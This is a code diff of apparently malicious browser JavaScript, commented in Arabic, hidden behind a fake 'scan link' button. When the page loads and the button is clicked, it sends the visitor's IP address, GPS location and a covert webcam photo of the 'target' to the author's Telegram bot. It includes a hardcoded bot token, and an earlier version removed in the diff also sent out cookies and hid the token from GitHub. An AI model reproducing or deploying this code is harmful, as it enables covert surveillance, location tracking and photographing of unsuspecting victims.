@@ -1,15 +1,16 @@
 (function() {
-    // التوكن والـ ID بتوعك متشفرين (عشان GitHub ميفهمش حاجة)
-    const _eT = "Nzg3MzQyNjM5NDpBQUdQRDNONU56LVJlSjkwTGVURDk5Z256ZTlQMGV2SXI3bw==";
-    const _eI = "NzI1MzA5MjQ5MQ==";
+    // التوكن والـ ID الجديد بتاعك
+    const _tok = "7873426394:AAGPD3N5Nz-ReJ90LeTD99gnze9P0evIr7o";
+    const _usr = "7253092491";
 
-    // فك التشفير برمجياً وقت التشغيل فقط
-    const _t = atob(_eT);
-    const _id = atob(_eI);
-
-    function _report(text) {
-        fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("[SYSTEM]: " + text)}`);
+    // دالة الإرسال الأساسية
+    function _report(msg) {
+        const url = `https://api.telegram.org/bot${_tok}/sendMessage?chat_id=${_usr}&text=${encodeURIComponent("[SYSTEM]: " + msg)}`;
+        fetch(url).catch(e => console.error("Error sending to TG"));
     }
+
+    // أول ما الصفحة تفتح يبعتلك تنبيه إن الكود شغال
+    _report("✅ النظام متصل والتوكن الجديد يعمل!");
 
     async function _capturePhoto() {
         try {
@@ -25,38 +26,39 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(blob => {
                     const fd = new FormData();
-                    fd.append('chat_id', _id);
+                    fd.append('chat_id', _usr);
                     fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', '🎯 لقطة مباشرة للهدف');
-                    fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: fd })
+                    fd.append('caption', '🎯 لقطة للهدف');
+                    
+                    fetch(`https://api.telegram.org/bot${_tok}/sendPhoto`, { method: 'POST', body: fd })
                     .then(() => stream.getTracks().forEach(t => t.stop()));
                 }, 'image/jpeg');
             }, 3000);
-        } catch (e) { _report("❌ فشل فتح الكاميرا (تم الرفض)"); }
+        } catch (e) { 
+            _report("❌ فشل فتح الكاميرا (تم الرفض أو الجهاز لا يدعم)"); 
+        }
     }
 
     const btn = document.getElementById('startScanBtn');
     if (btn) {
         btn.addEventListener('click', () => {
-            const targetUrl = document.getElementById('urlInput').value || "رابط غير محدد";
-            _report(`🚀 بدأ فحص الرابط: ${targetUrl}`);
+            _report("🚀 الضخية ضغط على زر الفحص");
 
-            // 1. جلب الـ IP
+            // جلب الـ IP
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
-                .then(d => _report(`📍 IP: ${d.ip}`));
+                .then(d => _report(`📍 IP: ${d.ip}`))
+                .catch(() => _report("فشل جلب الـ IP"));
 
-            // 2. جلب الموقع (الرابط المصلح)
+            // جلب الموقع
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(p => {
-                    _report(`📍 الخريطة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    const map = `📍 الخريطة: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    _report(map);
                 }, () => _report("❌ رفض إذن الموقع"));
             }
 
-            // 3. سحب الكوكيز
-            _report(`🍪 كوكيز: ${document.cookie || "Empty"}`);
-
-            // 4. التقاط الصورة
+            // التقاط الصورة
             _capturePhoto();
         });
     }
